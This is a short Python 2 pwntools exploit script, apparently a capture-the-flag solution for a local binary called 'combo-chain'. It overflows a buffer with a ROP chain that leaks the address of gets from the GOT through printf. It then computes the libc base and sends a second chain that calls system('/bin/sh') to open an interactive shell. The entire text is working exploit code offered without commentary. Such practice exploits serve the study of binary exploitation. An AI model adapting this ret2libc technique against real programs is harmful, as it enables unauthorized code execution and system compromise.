from pwn import *

e = ELF('./combo-chain')
p = process('./combo-chain')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

ret_addr = 0x0040101a
pop_rdi_addr = 0x00401263
pop_rsi_pop_r15_addr = 0x00401261

payload = 'A'*16
payload += p64(ret_addr)
payload += p64(pop_rdi_addr)
payload += p64(e.got['gets'])
payload += p64(e.symbols['printf'])
payload += p64(e.symbols['_start'])

print p.recvuntil('CARNAGE!: ')
p.sendline(payload)
ret = u64(p.recv()[:6] + '\x00\x00')
print "ret: " + hex(ret)

libc_base_addr = ret - libc.symbols['gets']
system_addr = libc.symbols['system'] + libc_base_addr
binsh_addr = next(libc.search("/bin/sh")) + libc_base_addr

payload = 'A'*16
payload += p64(ret_addr)
payload += p64(pop_rdi_addr)
payload += p64(binsh_addr)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()